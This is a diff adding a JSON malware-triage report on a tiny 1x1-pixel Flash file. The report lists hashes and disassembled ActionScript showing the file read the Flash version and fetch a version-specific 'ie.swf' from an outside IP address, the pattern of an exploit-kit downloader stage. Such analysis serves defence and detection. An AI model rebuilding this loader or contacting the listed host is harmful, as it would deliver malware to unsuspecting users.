@@ -1,0 +1,157 @@
+{
+    "_id": "2db504ad-377b-4cf9-b85a-de2dafff1b71",
+    "characteristics": {
+        "swf": {
+            "compression": "none",
+            "swf metadata": {
+                "framecount": 1,
+                "framerate": 3072,
+                "resolution": "1 x 1",
+                "version": 7,
+                "xmax": 1,
+                "xmin": 0,
+                "ymax": 1,
+                "ymin": 0
+            },
+            "tag types": [
+                {
+                    "count": 1,
+                    "tag name": "DoAction"
+                },
+                {
+                    "count": 1,
+                    "tag name": "SetBackgroundColor"
+                },
+                {
+                    "count": 1,
+                    "tag name": "End"
+                },
+                {
+                    "count": 1,
+                    "tag name": "ShowFrame"
+                }
+            ],
+            "warnings": [
+                "The length of the file does not match reported length"
+            ]
+        }
+    },
+    "metadata": {
+        "_id": "2db504ad-377b-4cf9-b85a-de2dafff1b71",
+        "entropy": 5.0653336808715075,
+        "file_name": "5a11d899b9cacc5a476c7252a1c1452589c50054cfba7c1464bab59e4d711f0d",
+        "file_size": 136,
+        "libmagic": "Macromedia Flash data, version 7",
+        "md5": "1f807a3e67b84f1f92307133c63f47ea",
+        "mimetype": "application/x-shockwave-flash",
+        "parent_sha256": "5a11d899b9cacc5a476c7252a1c1452589c50054cfba7c1464bab59e4d711f0d",
+        "score": 0,
+        "sha1": "7cfbb203059fe362e7aec69422ee65c3c977aa7f",
+        "sha256": "5a11d899b9cacc5a476c7252a1c1452589c50054cfba7c1464bab59e4d711f0d",
+        "ssdeep": "3:LPL8t3aboAXWtEMwNVfK2VGMCpl+zXXEJXEy/ll:zLSKbo7DwNA2VVCyeztl"
+    },
+    "verbose": {
+        "swf": {
+            "SWF Constant Pool Analysis": {
+                "constant pool 0": {
+                    "obfuscated_data": {
+                        "base64": {
+                            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/": "flashVersion"
+                        },
+                        "signatures": {
+                            "http": "rot0"
+                        }
+                    }
+                }
+            },
+            "SWF String Statistical Analysis": {
+                "Constant Pool String Length Mean to Median Ratio": "1.16"
+            },
+            "tags": [
+                {
+                    "SetBackgroundColor": {
+                        "blue": 255,
+                        "green": 255,
+                        "red": 255
+                    }
+                },
+                {
+                    "DoAction": {
+                        "actions": [
+                            {
+                                "ActionConstantPool": {
+                                    "constant pool": [
+                                        "flashVersion",
+                                        "/:$version",
+                                        "http://219.153.71.185/ri/",
+                                        "ie.swf",
+                                        "_root"
+                                    ],
+                                    "pool count": 5
+                                }
+                            },
+                            {
+                                "ActionPush": [
+                                    {
+                                        "pushType": 8,
+                                        "pushTypeName": "constant8",
+                                        "pushValue": 0,
+                                        "value": "flashVersion"
+                                    }
+                                ]
+                            },
+                            "ActionGetVariable",
+                            "ActionDefineLocal",
+                            {
+                                "ActionPush": [
+                                    {
+                                        "pushType": 8,
+                                        "pushTypeName": "constant8",
+                                        "pushValue": 2,
+                                        "value": "http://219.153.71.185/ri/"
+                                    }
+                                ]
+                            },
+                            "ActionGetVariable",
+                            "ActionAdd2",
+                            {
+                                "ActionPush": [
+                                    {
+                                        "pushType": 8,
+                                        "pushTypeName": "constant8",
+                                        "pushValue": 3,
+                                        "value": "ie.swf"
+                                    }
+                                ]
+                            },
+                            "ActionAdd2",
+                            {
+                                "ActionPush": [
+                                    {
+                                        "pushType": 8,
+                                        "pushTypeName": "constant8",
+                                        "pushValue": 4,
+                                        "value": "_root"
+                                    }
+                                ]
+                            },
+                            "ActionGetVariable",
+                            {
+                                "ActionGetURL2": {
+                                    "method": "GET"
+                                }
+                            },
+                            "ActionStop"
+                        ]
+                    }
+                },
+                {
+                    "ShowFrame": {}
+                },
+                {
+                    "End": {}
+                }
+            ]
+        }
+    }
+}
